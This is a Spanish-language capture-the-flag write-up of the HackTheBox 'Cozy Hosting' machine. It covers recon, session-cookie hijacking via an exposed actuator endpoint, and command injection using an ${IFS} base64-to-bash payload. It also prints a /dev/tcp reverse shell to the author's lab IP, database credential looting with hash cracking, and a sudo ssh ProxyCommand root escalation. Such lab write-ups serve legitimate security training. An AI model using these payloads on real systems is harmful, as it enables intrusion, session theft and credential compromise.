---
title: 'Cozy Hosting'
description: 'WriteUp de la máquina Cozy Hosting'
pubDate: 'Sep 09 2023'
heroImage: '/htb/cozy_hosting/placeholder.png'
private: false
category: 'writeups'
tags: ['htb']
---

La máquina Cozy Hosting, fue una máquina de temporada de HackTheBox de dificultad fácil declarada por la plataforma.

## Fase de reconocimiento
### Escaneo de la máquina
Lo que siempre se debe hacer al inicio es realizar una traza TCP por ping para detectar si la máquina está activa y ver ante que sistema operativo nos enfrentamos mediante el TTL, el cual al ser de 63 la identificamos como una máquina Linux.

![Captura ping](https://i.imgur.com/9KDP4Ba.png)

Confirmando que ya poseemos conexión con la máquina, procedemos a realizar un escaneo con nmap, primero comenzamos con por el protocolo TCP y luego, en el caso de no encontrar nada, usamos UDP.

Comenzamos escanenando todo el rango de puertos y le agregamos los siguientes parámetros para un escáneo rápido:

```bash
-p- # Para barcar los 65535 puertos
--open # Solo obtener los puertos con estado open
-sS # Realizar escaneo TCP SYN SCAN
--min-rate 5000 # Envío mínimo de 5000 paquetes por segundos
-v # Verbose
-n # Evitar resolución DNS
-Pn # Evitar host discovery
-oG # Exporte en formato greppeable 
# para luego usar extractPorts
```

###### [!] Existen casos en los que usar 5000 paquetes es demasiado, en esos casos reducir a la mitad.
###### [!] ExtractPorts es un script creado por s4vitar para la rápida extracción de puertos de una captura de nmap [link](https://gist.github.com/Nileath/8f3e8c135963636cda3d2810e9a3824f)


![Captura nmap](https://i.imgur.com/u38NVLO.png)

Con esto ya sabemos que tiene un servicio SSH corriendo (puerto 22) y un servidor web (puerto 80), de todas formas siempre es recomendable obtener más información de estos servicios, para eso usamos los scripts básicos de reconocimiento y versionado de nmap
```bash
-sC # Reconocimiento
-sV # Versionado

-sCV # Ambos
```

![Captura nmap](https://i.imgur.com/nQYcNoV.png)

Al mismo tiempo, para agilizar, podemos ir escaneando la web con la herramienta `whatweb`, la cual nos entrega información sobre el sitio y también, en este caso, que se está generando virtual hosting y se tiene una redirección a `cozyhosting.htb`, por lo cual debemos agregarlo en el archivo `/etc/hosts` del sistema:

![Captura whatweb](https://i.imgur.com/eCcePfM.png)

El escaneo con el host:
![Captura whatweb con el hosting correcto](https://i.imgur.com/AcCS60V.png)

También podemos escanear la web con `wappalizer`, que es una extensión tanto [firefox](https://addons.mozilla.org/es/firefox/addon/wappalyzer/) como para [chrome](https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg)

![Captura wappalizer](https://i.imgur.com/9Dnk5Cf.png)

Como podemos ver, nos encontramos ante un sistema Ubuntu, con un servidor nginx versión 1.18.0 y también vemos un email `info@cozyhosting.htb`. Toda esta información debemos recopilarla ya que nos puede servir.

En un vistazo rápido por la web, podemos ver un llamativo botón de login en el header, dentro del home no encontramos nada más que nos pueda ser útil.

### Accediento al sitio
Ya en el panel de login, podemos probar las credenciales genéricas y ver si nos responde algún mensaje o error que nos de más información, pero probando lo básico nos damos cuenta que necesitaremos alguna credencial.

![Captura panel de login](https://i.imgur.com/IENctZd.png)

Luego de probar y ver las respuestas, nos percatamos que se está almacenando, en el apartado de Storages/Cookies, una cookie de sesión, lo cual nos puede dar un indicio de como vulnerar este panel
![Captura panel storage](https://i.imgur.com/YbqRqWn.png)

De todas formas, siempre es recomendable realizar un Fuzzing a la web, para ver si podemos encontrar alguna ruta que nos pueda entregar más información. Comenzamos con wfuzz, usando hilos y con el diccionario de [SecList](https://github.com/danielmiessler/SecLists), con el cual usaremos los que se encuentran en `Discovery/Web-Content`, yo suelo usar los siguentes:

- quickhits.txt
- directory-list-2.3-medium.txt
- directory-list-2.3-big.txt

![Captura wfuzz](https://i.imgur.com/txrKAvr.png)

Luego de usar el primer diccionario, podemos ver una ruta llamada `actuator` en el cual vemos varias subrutas que nos pueden interesar

![Captura ruta /actuator](https://i.imgur.com/Yj4cyfF.png)

La mayoria de rutas tienen información, pero recordando lo que habiamos visto anteriormente sobre la cookie de sesión, la ruta `/session` nos entrega información valiosa, la cookie de un usuario
![Captura cookie](https://i.imgur.com/uAFZpWk.png)

Ya con esta cookie, la reemplazamos por la que tenemos en el navegador y ya podemos acceder al panel de administración
![Captura panel de administración](/htb/cozy_hosting/admin_panel.png)

## Fase de explotación
### Accediendo a un usuario
Una vez dentro del panel de administración, vemos al pie de la página un formulario de una conexión SSH, el cual al intentar enviar datos, vemos que tiene validaciones
![Captura formulario web](https://i.imgur.com/zkk7hSZ.png)

Si lo interceptamos con BurpSuite e intentamos enviar nuestros datos, vemos que responde un 302 e indica un timeout luego de seguir la redirección, pero si intentamos enviar datos no esperados, podemos ver que al no ingresar un host, no procesa la solicitud, pero si evitamos enviar un username, podemos ver un mensaje interesante:
![Captura burpsuite sin username](https://i.imgur.com/fgq4ji8.png)
Pero al intentar ejecutar algun comando, vemos que tiene una pequeña validación que evita los espacios en blanco, por lo cual nos complica un poco el cómo ejecutar un comando para acceder a la máquina.
Pero aún disponemos de la variable de [IFS de linux](https://bash.cyberciti.biz/guide/$IFS), la cual nos sirve para agregar los espacios que requerira nuestro payload, por lo cual usaremos lo siguiente

```bash
# Lo que buscamos
;echo "<BASE64_PAYLOAD>" | base64 -d | bash;

# Ya transformado
;echo${IFS}"<BASE64_PAYLOAD>"|base64${IFS}-d|bash;
```

Probando un curl hacia nuestra máquina, vemos que nuestro payload funciona.
![Captura curl](https://i.imgur.com/z3awMFF.png)

Por lo cual ya podremos ejecutar una reverse shell para acceder a la máquina víctima
```bash
# Payload a usar en base64
echo -n "/bin/bash -l>/dev/tcp/10.10.14.114/443 0<&1 2>&1" | base64
```
###### [!] En el caso de que tu reverse shell generada con base64 tenga un símbolo de +, debes modificarlo para que no esté o el validador te indicará que no se permiten espacios
###### [!] En mi caso eliminé los espacios del -l y el > y ya no mostró ese símbol

Una vez dentro de la máquina, vemos que estamos con el usario `app` y debemos llegar al usuario `josh`, el cual podemos ver listando el directorio `/home`

Justo dentro del directorio en donde obtenemos el acceso, `/app`, podemos ver un archivo llamado `cloudhosting-0.0.1.jar` el cual podemos investigar para buscar información, alguna credencial o algun indicio para escalar privilegios.

![Captura directio /app](https://i.imgur.com/7Zz9fTO.png)

Por lo cual levantamos un pequeño servidor http con python en la máquina víctima, para poder descargar el fichero desde el navegador de forma más cómoda
```bash
python3 -m http.server 4000
```
![Captura server http con python](https://i.imgur.com/NPhgOQo.png)

Ya obtenido el archivo jar, extraemos su contenido con el comando jar
```bash
jar -xf cloudhosting-0.0.1.jar
```

Y revisando sus ficheros, vemos el siguiente fichero `BOOT-INF/classes/application.properties`, en el cual vemos las credenciales de PostgreSql
![Captura archivo application.properties](https://i.imgur.com/fRyLstJ.png)

Si nos conectamos al postgre y le indicamos la contraseña, vemos que podemos acceder
```bash
psql -h localhost -U postgres -p 5432
```

Listando las bases de datos, podemos ver una llamada cozyhosting, y dentro de ella una tabla de usuarios, el cual al listar podemos ver 2 usuarios y sus credenciales encriptadas, por lo cual podriamos probar con john y tratar de desencriptarlas por fuerza bruta.
![Captura tabla usuarios](https://i.imgur.com/k2zm9RD.png)

Preparamos un archivo, en mi caso lo llamé `hash.txt`, y se vería de la siguiente manera:
![Captura fichero hash.txt](https://i.imgur.com/KiqE4P1.png)

Vemos que una puede romperla sin problemas y es la del usuario admin
![Captura john](https://i.imgur.com/NeztBt5.png)

Si la probamos con el usuario josh, podremos ver que nos deja acceder y podremos ver la flag de usuario en su home
![Captura home Josh](https://i.imgur.com/8B1nkup.png)

### Obteniendo Root
La escalada a root de está máquina es bastante sencilla, ya que si usamos el comando `sudo -l` podremos ver que `josh` puede ejecutar como root el comando ssh y si buscamos en [GTFObins](https://gtfobins.github.io/gtfobins/ssh/) podremos ver el siguiente comando:
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
El cual al ejecutarlo, ya podremos tener acceso a root y por lo tanto a la flag.
![Captura root](https://i.imgur.com/Gi0xj5A.png)